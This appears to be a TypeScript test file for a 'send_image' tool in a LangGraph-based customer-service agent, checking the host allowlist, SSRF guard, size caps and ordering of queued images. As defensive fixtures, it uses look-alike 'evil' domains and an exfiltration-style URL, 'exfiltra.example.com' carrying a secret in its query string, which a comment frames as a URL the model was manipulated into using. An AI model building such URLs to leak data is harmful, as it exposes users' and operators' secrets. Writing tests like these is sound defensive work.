import { afterEach, describe, expect, test } from "bun:test";
import type { StructuredToolInterface } from "@langchain/core/tools";
import { buildNativeTools, type TurnState } from "@/graph/tools/native";
import type { ChatwootClient } from "@/modules/chatwoot/client";
import { fetchImageForDelivery } from "@/modules/images/fetch";
import {
  IMAGE_MAX_BYTES,
  isAllowedImageHost,
  normalizeAllowedHost,
  readSendImageConfig,
  SEND_IMAGE_MAX_CAPTION_CHARS,
  SEND_IMAGE_MAX_PER_TURN,
  SEND_IMAGE_MAX_TURN_BYTES,
} from "@/modules/images/settings";

// Issue #65. An agent that already holds a product image's URL had no way to deliver it: the only
// caller of sendFileAttachment was the Google Drive toolpack, so "send a picture" meant "upload the
// catalogue to Drive first". The tool that closes it fetches a URL the MODEL chose, which is why
// every test below is about what the fetch REFUSES as much as about what it delivers.

const PNG = new Uint8Array([
  0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d,
]);
const GIF = new Uint8Array([
  0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00,
]);
const HTML = new TextEncoder().encode("<!doctype html><html><body>não</body>");

interface Call {
  url: string;
  redirect?: RequestRedirect;
}

// Stands in for the remote image host. `body` is delivered as a STREAM, because the byte cap has to
// hold against a server that lies in (or omits) content-length.
function fakeHost(
  body: Uint8Array,
  opts: {
    status?: number;
    contentType?: string;
    contentLength?: string;
    chunkSize?: number;
  } = {},
) {
  const calls: Call[] = [];
  const impl = (async (input: string | URL, init?: RequestInit) => {
    calls.push({ url: String(input), redirect: init?.redirect });
    const chunk = opts.chunkSize ?? 8;
    const stream = new ReadableStream<Uint8Array>({
      start(controller) {
        for (let i = 0; i < body.length; i += chunk) {
          controller.enqueue(body.slice(i, i + chunk));
        }
        controller.close();
      },
    });
    return new Response(stream, {
      status: opts.status ?? 200,
      headers: {
        "content-type": opts.contentType ?? "image/png",
        ...(opts.contentLength ? { "content-length": opts.contentLength } : {}),
      },
    });
  }) as unknown as typeof fetch;
  return { impl, calls };
}

const noSsrf = async (url: string) => new URL(url);
const HOSTS = { allowedHosts: ["cdn.loja.com.br", "*.imagens.com.br"] };

describe("the operator's host list", () => {
  test("accepts what an operator actually pastes", () => {
    expect(normalizeAllowedHost("CDN.Loja.com.br")).toBe("cdn.loja.com.br");
    expect(normalizeAllowedHost("https://cdn.loja.com.br/img/1.png")).toBe(
      "cdn.loja.com.br",
    );
    expect(normalizeAllowedHost("cdn.loja.com.br:443")).toBe("cdn.loja.com.br");
    expect(normalizeAllowedHost("*.loja.com.br")).toBe("*.loja.com.br");
    expect(normalizeAllowedHost("  ")).toBeNull();
    expect(normalizeAllowedHost("localhost")).toBeNull();
    expect(normalizeAllowedHost(42)).toBeNull();
  });

  test("a wildcard covers the domain and its subdomains, and nothing that merely ends like it", () => {
    const hosts = ["*.loja.com.br"];
    expect(isAllowedImageHost("loja.com.br", hosts)).toBe(true);
    expect(isAllowedImageHost("cdn.loja.com.br", hosts)).toBe(true);
    expect(isAllowedImageHost("a.b.loja.com.br", hosts)).toBe(true);
    // The one that matters: a look-alike domain someone else registered.
    expect(isAllowedImageHost("evil-loja.com.br", hosts)).toBe(false);
    expect(isAllowedImageHost("loja.com.br.evil.com", hosts)).toBe(false);
  });

  test("an exact entry stays exact", () => {
    const hosts = ["cdn.loja.com.br"];
    expect(isAllowedImageHost("cdn.loja.com.br", hosts)).toBe(true);
    expect(isAllowedImageHost("outro.loja.com.br", hosts)).toBe(false);
  });

  test("the stored config normalizes, dedups and survives junk", () => {
    expect(
      readSendImageConfig({
        sendImage: {
          allowedHosts: [
            "https://cdn.loja.com.br/x",
            "CDN.loja.com.br",
            "",
            null,
            "*.imagens.com.br",
          ],
        },
      }),
    ).toEqual({ allowedHosts: ["cdn.loja.com.br", "*.imagens.com.br"] });
    expect(readSendImageConfig({})).toEqual({ allowedHosts: [] });
    expect(
      readSendImageConfig({ sendImage: { allowedHosts: "tudo" } }),
    ).toEqual({ allowedHosts: [] });
  });
});

describe("fetching the image", () => {
  test("an allowed host delivers, with the type read from the file itself", async () => {
    const host = fakeHost(PNG);
    const res = await fetchImageForDelivery(
      "https://cdn.loja.com.br/fotos/Camiseta Azul.PNG?v=2",
      HOSTS,
      { fetchImpl: host.impl, assertSafe: noSsrf },
    );
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.mime).toBe("image/png");
    // The name is ours, not the URL's: it is text the model chose that would otherwise reach the
    // customer without passing the output guardrail.
    expect(res.fileName).toBe("imagem.png");
    expect(new Uint8Array(res.bytes)).toEqual(PNG);
    // A redirect is a second URL nobody allowlisted.
    expect(host.calls[0]?.redirect).toBe("error");
  });

  test("an unlisted host is refused before anything is even resolved", async () => {
    const host = fakeHost(PNG);
    let resolved = 0;
    const res = await fetchImageForDelivery(
      "https://cdn.atacante.com/foto.png",
      HOSTS,
      {
        fetchImpl: host.impl,
        assertSafe: async (u) => {
          resolved++;
          return new URL(u);
        },
      },
    );
    expect(res).toMatchObject({ ok: false, reason: "host_not_allowed" });
    expect(host.calls).toEqual([]);
    expect(resolved).toBe(0);
  });

  // An empty list is the default, so granting the tool without configuring it must not open a
  // fetcher for arbitrary URLs.
  test("no configured host refuses everything", async () => {
    const host = fakeHost(PNG);
    const res = await fetchImageForDelivery(
      "https://cdn.loja.com.br/foto.png",
      { allowedHosts: [] },
      { fetchImpl: host.impl, assertSafe: noSsrf },
    );
    expect(res).toMatchObject({ ok: false, reason: "no_hosts_configured" });
    expect(host.calls).toEqual([]);
  });

  test("an allowed host on a private address is still refused", async () => {
    const host = fakeHost(PNG);
    const res = await fetchImageForDelivery(
      "https://cdn.loja.com.br/foto.png",
      HOSTS,
      {
        fetchImpl: host.impl,
        assertSafe: async () => {
          throw new (await import("@/lib/ssrf")).SsrfError("private address");
        },
      },
    );
    expect(res).toMatchObject({ ok: false, reason: "invalid_url" });
    expect(host.calls).toEqual([]);
  });

  test("a body past the cap is cut off, whatever content-length claimed", async () => {
    const big = new Uint8Array(IMAGE_MAX_BYTES + 1_024);
    big.set(PNG);
    const host = fakeHost(big, {
      contentLength: "10",
      chunkSize: 64 * 1024,
    });
    const res = await fetchImageForDelivery(
      "https://cdn.loja.com.br/enorme.png",
      HOSTS,
      { fetchImpl: host.impl, assertSafe: noSsrf },
    );
    expect(res).toMatchObject({ ok: false, reason: "too_large" });
  });

  test("a page that claims to be a PNG is not one", async () => {
    const host = fakeHost(HTML, { contentType: "image/png" });
    const res = await fetchImageForDelivery(
      "https://cdn.loja.com.br/foto.png",
      HOSTS,
      { fetchImpl: host.impl, assertSafe: noSsrf },
    );
    expect(res).toMatchObject({ ok: false, reason: "not_an_image" });
  });

  test("a type declared wrong but genuinely an image goes through, as itself", async () => {
    const host = fakeHost(GIF, { contentType: "application/octet-stream" });
    const res = await fetchImageForDelivery(
      "https://promos.imagens.com.br/banner",
      HOSTS,
      { fetchImpl: host.impl, assertSafe: noSsrf },
    );
    expect(res).toMatchObject({ ok: true, mime: "image/gif" });
    if (res.ok) expect(res.fileName).toBe("imagem.gif");
  });

  test("an HTTP error is reported as one", async () => {
    const host = fakeHost(PNG, { status: 404 });
    const res = await fetchImageForDelivery(
      "https://cdn.loja.com.br/sumiu.png",
      HOSTS,
      { fetchImpl: host.impl, assertSafe: noSsrf },
    );
    expect(res).toMatchObject({
      ok: false,
      reason: "http_error",
      detail: "404",
    });
  });

  test("a URL that is not one is refused, not thrown", async () => {
    const res = await fetchImageForDelivery("nao é uma url", HOSTS, {
      assertSafe: noSsrf,
    });
    expect(res).toMatchObject({ ok: false, reason: "invalid_url" });
  });
});

interface Sent {
  conversationId: number;
  fileName: string;
  mime: string;
  bytes: number;
  caption?: string;
}

function stubClient(sent: Sent[], fail = false): ChatwootClient {
  return {
    sendFileAttachment: async (
      conversationId: number,
      bytes: ArrayBuffer,
      fileName: string,
      mime: string,
      opts: { caption?: string } = {},
    ) => {
      if (fail) throw new Error("chatwoot 502");
      sent.push({
        conversationId,
        fileName,
        mime,
        bytes: bytes.byteLength,
        caption: opts.caption,
      });
      return null;
    },
  } as unknown as ChatwootClient;
}

function sendImage(
  tools: StructuredToolInterface[],
): StructuredToolInterface | undefined {
  return tools.find((t) => t.name === "send_image");
}

const original = globalThis.fetch;
afterEach(() => {
  globalThis.fetch = original;
});

describe("the send_image tool", () => {
  // The tool QUEUES: delivery belongs to the post-turn pipeline, after the ownership recheck, the
  // supersede gate and the output guardrail. A tool that posts from inside the graph invocation can
  // message a customer whose turn is then discarded — the same reason resolve_conversation defers.
  test("queues the image with its caption instead of sending it mid-turn", async () => {
    const sent: Sent[] = [];
    const host = fakeHost(PNG);
    const turnState: TurnState = {
      resolveRequested: false,
      pendingAttachments: [],
      imagesInFlight: 0,
      documentsInFlight: 0,
      attachmentsSeq: 0,
    };
    const tools = buildNativeTools(
      {
        client: stubClient(sent),
        conversationId: 42,
        sendImage: HOSTS,
        fetchImpl: host.impl,
        assertSafe: noSsrf,
        turnState,
      },
      ["send_image"],
    );
    const out = await sendImage(tools)?.invoke({
      url: "https://cdn.loja.com.br/camiseta.png",
      caption: "Essa é a azul",
    });
    expect(String(out)).toContain("Imagem pronta para envio");
    expect(sent).toEqual([]);
    expect(turnState.pendingAttachments).toHaveLength(1);
    expect(turnState.pendingAttachments[0]).toMatchObject({
      fileName: "imagem.png",
      mime: "image/png",
      caption: "Essa é a azul",
      // The queue is shared with the document tools, so what an entry is has to travel with it: the
      // delivery loop reads `tool` for the flow line and `kind` for the quota, and an image that
      // arrives untagged would be counted against neither.
      tool: "send_image",
      kind: "image",
    });
    expect(turnState.pendingAttachments[0]?.bytes.byteLength).toBe(
      PNG.byteLength,
    );
  });

  // A proactive nudge has no turn to queue into, and its own gate (the 24h service window) decides
  // whether anything may be sent at all. Declining is the only safe answer there — and it is decided
  // BEFORE the download, so a refusal never costs a DNS lookup and up to 5 MB over ten seconds.
  test("declines when there is no turn to queue into, without fetching", async () => {
    const sent: Sent[] = [];
    const host = fakeHost(PNG);
    const tools = buildNativeTools(
      {
        client: stubClient(sent),
        conversationId: 42,
        sendImage: HOSTS,
        fetchImpl: host.impl,
        assertSafe: noSsrf,
      },
      ["send_image"],
    );
    const out = await sendImage(tools)?.invoke({
      url: "https://cdn.loja.com.br/camiseta.png",
    });
    expect(String(out)).toContain("link em texto");
    expect(sent).toEqual([]);
    expect(host.calls).toEqual([]);
  });

  // One model response can carry a batch of tool calls, and every accepted image is held in memory
  // until the turn's gates clear. The ceiling is checked before the download, so an over-budget call
  // costs nothing.
  test("the per-turn queue has a ceiling, enforced before the download", async () => {
    const sent: Sent[] = [];
    const host = fakeHost(PNG);
    const turnState: TurnState = {
      resolveRequested: false,
      pendingAttachments: [],
      imagesInFlight: 0,
      documentsInFlight: 0,
      attachmentsSeq: 0,
    };
    const tools = buildNativeTools(
      {
        client: stubClient(sent),
        conversationId: 42,
        sendImage: HOSTS,
        fetchImpl: host.impl,
        assertSafe: noSsrf,
        turnState,
      },
      ["send_image"],
    );
    const outs: string[] = [];
    for (let i = 0; i < SEND_IMAGE_MAX_PER_TURN + 2; i++) {
      outs.push(
        String(
          await sendImage(tools)?.invoke({
            url: `https://cdn.loja.com.br/camiseta-${i}.png`,
          }),
        ),
      );
    }
    expect(turnState.pendingAttachments).toHaveLength(SEND_IMAGE_MAX_PER_TURN);
    expect(host.calls).toHaveLength(SEND_IMAGE_MAX_PER_TURN);
    expect(outs[SEND_IMAGE_MAX_PER_TURN]).toContain("Limite de imagens");
    expect(sent).toEqual([]);
  });

  // How a batch actually arrives: LangGraph's ToolNode runs one response's tool calls with
  // Promise.all. A ceiling checked across the download is read by every call while the queue is
  // still empty, so all of them pass and the ceiling means nothing.
  test("the ceiling holds when the whole batch runs at once", async () => {
    const sent: Sent[] = [];
    const host = fakeHost(PNG);
    const turnState: TurnState = {
      resolveRequested: false,
      pendingAttachments: [],
      imagesInFlight: 0,
      documentsInFlight: 0,
      attachmentsSeq: 0,
    };
    const tools = buildNativeTools(
      {
        client: stubClient(sent),
        conversationId: 42,
        sendImage: HOSTS,
        fetchImpl: host.impl,
        assertSafe: noSsrf,
        turnState,
      },
      ["send_image"],
    );
    const outs = await Promise.all(
      Array.from({ length: 12 }, (_, i) =>
        sendImage(tools)
          ?.invoke({ url: `https://cdn.loja.com.br/lote-${i}.png` })
          .then(String),
      ),
    );
    expect(turnState.pendingAttachments).toHaveLength(SEND_IMAGE_MAX_PER_TURN);
    expect(host.calls.length).toBeLessThanOrEqual(SEND_IMAGE_MAX_PER_TURN);
    expect(outs.filter((o) => o?.includes("Limite de imagens"))).toHaveLength(
      12 - SEND_IMAGE_MAX_PER_TURN,
    );
    // The reservation is released either way, so a later turn is not permanently short of slots.
    expect(turnState.imagesInFlight).toBe(0);
  });

  // The SSRF assertion resolves DNS, and a wildcard allowlist lets the model name a subdomain that
  // does not exist. A resolver retrying that one held the turn open on its own schedule, because the
  // fetch's timeout had not been created yet.
  test("a slow DNS lookup is bound by the same timeout as the download", async () => {
    const host = fakeHost(PNG);
    const started = Date.now();
    const res = await fetchImageForDelivery(
      "https://nao-existe.imagens.com.br/x.png",
      HOSTS,
      {
        fetchImpl: host.impl,
        // Stands for a resolver that never answers.
        assertSafe: () => new Promise<URL>(() => {}),
        timeoutMs: 50,
      },
    );
    expect(res.ok).toBe(false);
    if (!res.ok) expect(res.reason).toBe("unreachable");
    // The deadline fired, rather than the call hanging until the test itself timed out.
    expect(Date.now() - started).toBeLessThan(2_000);
    // And it never reached the host.
    expect(host.calls).toHaveLength(0);
  });

  // A caption rides along with the attachment, and a channel that caps it rejects the whole upload —
  // so an over-long caption does not cost the sentence, it costs the picture. Same 500 as
  // drive_send_file, which posts through the same sendFileAttachment path.
  test("a caption past the cap is refused before anything is queued", async () => {
    const sent: Sent[] = [];
    const host = fakeHost(PNG);
    const turnState: TurnState = {
      resolveRequested: false,
      pendingAttachments: [],
      imagesInFlight: 0,
      documentsInFlight: 0,
      attachmentsSeq: 0,
    };
    const tools = buildNativeTools(
      {
        client: stubClient(sent),
        conversationId: 42,
        sendImage: HOSTS,
        fetchImpl: host.impl,
        assertSafe: noSsrf,
        turnState,
      },
      ["send_image"],
    );
    const out = await sendImage(tools)
      ?.invoke({
        url: "https://cdn.loja.com.br/x.png",
        caption: "a".repeat(SEND_IMAGE_MAX_CAPTION_CHARS + 1),
      })
      .catch((e: unknown) => String(e));
    expect(String(out)).toMatch(/too_big|at most|500/i);
    expect(turnState.pendingAttachments).toHaveLength(0);
  });

  // The batch runs concurrently, so the queue fills in COMPLETION order: the ticket is what remembers
  // the order the model asked for, and the runtime delivers by it. A caption is written for the
  // picture it sits next to.
  test("the ticket remembers the model's order when the downloads finish out of it", async () => {
    const sent: Sent[] = [];
    const turnState: TurnState = {
      resolveRequested: false,
      pendingAttachments: [],
      imagesInFlight: 0,
      documentsInFlight: 0,
      attachmentsSeq: 0,
    };
    // The image the model asked for FIRST is the slow one.
    const unevenHost = (async (input: string | URL) => {
      if (String(input).endsWith("primeira.png")) {
        await new Promise((r) => setTimeout(r, 25));
      }
      return new Response(PNG, {
        status: 200,
        headers: { "content-type": "image/png" },
      });
    }) as unknown as typeof fetch;
    const tools = buildNativeTools(
      {
        client: stubClient(sent),
        conversationId: 42,
        sendImage: HOSTS,
        fetchImpl: unevenHost,
        assertSafe: noSsrf,
        turnState,
      },
      ["send_image"],
    );
    await Promise.all([
      sendImage(tools)?.invoke({
        url: "https://cdn.loja.com.br/primeira.png",
        caption: "Primeira",
      }),
      sendImage(tools)?.invoke({
        url: "https://cdn.loja.com.br/segunda.png",
        caption: "Segunda",
      }),
    ]);
    // The queue really is in completion order — which is why sorting on delivery is not decoration.
    expect(turnState.pendingAttachments.map((i) => i.caption)).toEqual([
      "Segunda",
      "Primeira",
    ]);
    expect(
      [...turnState.pendingAttachments]
        .sort((a, b) => a.order - b.order)
        .map((i) => i.caption),
    ).toEqual(["Primeira", "Segunda"]);
  });

  // The budget has to count the image being decided, not just the ones already in: excluding the
  // candidate lets the last accepted one carry the total past the ceiling.
  test("the byte budget counts the image it is deciding on", async () => {
    const sent: Sent[] = [];
    const big = new Uint8Array(5 * 1024 * 1024);
    big.set(PNG);
    const host = fakeHost(big, { chunkSize: 256 * 1024 });
    const turnState: TurnState = {
      resolveRequested: false,
      pendingAttachments: [],
      imagesInFlight: 0,
      documentsInFlight: 0,
      attachmentsSeq: 0,
    };
    const tools = buildNativeTools(
      {
        client: stubClient(sent),
        conversationId: 42,
        sendImage: HOSTS,
        fetchImpl: host.impl,
        assertSafe: noSsrf,
        turnState,
      },
      ["send_image"],
    );
    const outs: string[] = [];
    for (let i = 0; i < 3; i++) {
      outs.push(
        String(
          await sendImage(tools)?.invoke({
            url: `https://cdn.loja.com.br/grande-${i}.png`,
          }),
        ),
      );
    }
    const queued = turnState.pendingAttachments.reduce(
      (n, i) => n + i.bytes.byteLength,
      0,
    );
    expect(queued).toBeLessThanOrEqual(SEND_IMAGE_MAX_TURN_BYTES);
    expect(outs[2]).toContain("Limite de imagens");
  });

  // The whole point of binding the list to the config: a URL the model was talked into using does
  // not become a fetch just because the model asked nicely.
  test("a URL outside the list sends nothing and tells the agent what to do instead", async () => {
    const sent: Sent[] = [];
    const host = fakeHost(PNG);
    const turnState: TurnState = {
      resolveRequested: false,
      pendingAttachments: [],
      imagesInFlight: 0,
      documentsInFlight: 0,
      attachmentsSeq: 0,
    };
    const tools = buildNativeTools(
      {
        client: stubClient(sent),
        conversationId: 42,
        sendImage: HOSTS,
        fetchImpl: host.impl,
        assertSafe: noSsrf,
        turnState,
      },
      ["send_image"],
    );
    const out = await sendImage(tools)?.invoke({
      url: "https://exfiltra.example.com/pixel.png?dados=segredo",
    });
    expect(String(out)).toContain("não está na lista");
    expect(String(out)).toContain("link em texto");
    // The refusal does not echo the host back: it is a value the model composed, and this string is
    // the tool OUTPUT, which the flowlog stores verbatim.
    expect(String(out)).not.toContain("exfiltra.example.com");
    expect(String(out)).not.toContain("segredo");
    expect(sent).toEqual([]);
    expect(turnState.pendingAttachments).toEqual([]);
    expect(host.calls).toEqual([]);
  });

  test("with no host configured the tool says so instead of trying", async () => {
    const sent: Sent[] = [];
    const host = fakeHost(PNG);
    const turnState: TurnState = {
      resolveRequested: false,
      pendingAttachments: [],
      imagesInFlight: 0,
      documentsInFlight: 0,
      attachmentsSeq: 0,
    };
    const tools = buildNativeTools(
      {
        client: stubClient(sent),
        conversationId: 42,
        fetchImpl: host.impl,
        assertSafe: noSsrf,
        turnState,
      },
      ["send_image"],
    );
    const out = await sendImage(tools)?.invoke({
      url: "https://cdn.loja.com.br/camiseta.png",
    });
    expect(String(out)).toContain("nenhum host foi liberado");
    expect(sent).toEqual([]);
    expect(host.calls).toEqual([]);
  });

  // The model has to know where it may point the tool BEFORE it calls it, or it burns a turn
  // guessing. The hosts ride in the description's XML block, like every other per-turn ground truth.
  test("the description grounds the model on the configured hosts", () => {
    const withHosts = sendImage(
      buildNativeTools(
        { client: stubClient([]), conversationId: 1, sendImage: HOSTS },
        ["send_image"],
      ),
    );
    expect(withHosts?.description).toContain("<host>cdn.loja.com.br</host>");
    expect(withHosts?.description).toContain("<host>*.imagens.com.br</host>");
    const without = sendImage(
      buildNativeTools({ client: stubClient([]), conversationId: 1 }, [
        "send_image",
      ]),
    );
    expect(without?.description).toContain("Nenhum host liberado");
  });
});
